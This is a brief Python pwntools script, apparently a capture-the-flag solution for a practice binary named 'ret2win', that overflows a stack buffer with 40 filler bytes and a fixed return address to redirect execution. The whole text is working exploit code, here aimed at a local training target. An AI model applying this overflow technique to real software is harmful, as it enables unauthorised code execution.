from pwn import *

r=process('./ret2win')

r.recvuntil('> ')

payload="a"*40
payload+=p64(0x0000000000400756)

r.sendline(payload)
r.interactive()
